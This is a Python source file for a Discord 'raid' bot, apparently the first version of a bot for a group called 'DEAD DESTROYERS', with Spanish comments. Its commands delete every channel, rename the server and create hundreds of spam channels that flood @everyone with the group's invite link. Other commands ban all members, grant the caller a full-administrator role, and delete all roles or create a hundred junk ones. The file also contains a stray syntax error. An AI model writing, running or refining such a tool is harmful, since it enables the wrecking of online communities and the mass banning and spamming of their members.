
#Pasen Cp
#Este fue la primera vercion del bot faxter 

import discord
from discord.ext import commands
from discord.ext import tasks

whitelist = [1021098907071156285]




intents = discord.Intents().all()
intents.members = True

bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')




@bot.event
async def on_ready():
    print("LOGGED IN THE BOT. Mady by: AOS")
    myLoop.start()
    await bot.change_presence(activity=discord.Game(name="V1.3 | .help"))


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(
            f"Tu y/o el servidor estan en un cooldown de 10 minutos** Faltan:  {round(error.retry_after, 2)} ")


@bot.command(aliases=["dead"])
@commands.cooldown(1, 600, commands.BucketType.guild)
async def kill(ctx):

    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            await ctx.guild.edit(name="DD IS HERE")
            )
        except:
            pass
    for _i in range(1):
        await ctx.guild.create_text_channel(name="unete-a-dd")
    for _i in range(400):
        await ctx.guild.create_text_channel(
            name="r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷")


#Este era el spam de antes

@bot.event
async def on_guild_channel_create(channel):
    if (channel.name == 'r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷'):
        for _i in range(10):
            await channel.send(
                '> ||@everyone|| /n **__Raided By DEAD DESTROYERS__**   | https://discord.gg/Q9fac9jkaF | https://imgur.com/a/pkewvSu'
            )

    if channel.name == "unete-a-dd":
        for _i in range(1):
            await channel.send(
                '> ||@everyone|| /n **__Unete a DD para recuperar tu servidor y usar este bot__** | https://discord.gg/Q9fac9jkaF'
            )


#leave
@bot.command()
async def bye(ctx):
    await ctx.send("@everyone Adios xd")
    await ctx.guild.leave()
   

#banall
@bot.command()
async def banall(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"BANNED {user}")
        except:
           pass
    


#admin
@bot.command(pass_context=True)
@commands.cooldown(1, 600, commands.BucketType.user)
async def admin(ctx):
    await ctx.message.delete()
    try:
        guild = ctx.guild
        role = await guild.create_role(name="DD Admin",
                                       permissions=discord.Permissions(8),
                                       colour=discord.Colour(000000))
        authour = ctx.message.author
        await authour.add_roles(role)
    except:
        pass


@bot.command()
@commands.cooldown(1, 600, commands.BucketType.user)
async def droles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    await ctx.message.delete()


@bot.command(pass_context=True)
async def help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(colour=discord.Colour.red())

    embed.set_author(name='El poder de DDBOT')
    embed.add_field(name='<a:_:1012466114183319592> .banall',value='Banea a todos en el servidor',inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .admin', value='Te otorga admin', inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .kill',value='Elimina todos los canales y crea nuevos con spam',)

    embed.add_field(name='<a:_:1012466114183319592> .droles',value='Elimina todos los roles',inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .croles', value='Crea muchos roles', inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .bye', value='Termina el raid y abandona el servidor', inline=False)


    await ctx.send(embed=embed)


@bot.command()
@commands.cooldown(1, 600, commands.BucketType.user)
@commands.cooldown(1, 600, commands.BucketType.guild)
async def croles(ctx):
    await ctx.message.delete()
    for _i in range(100):
        await ctx.guild.create_role(name="#DD")




@tasks.loop(seconds=3600) 
async def myLoop():
 for guild in bot.guilds:
        try:
            if guild.id not in whitelist:
                server = bot.get_guild(guild.id)
                await server.leave()
        except:
                     pass



bot.run("token de tu bot ")
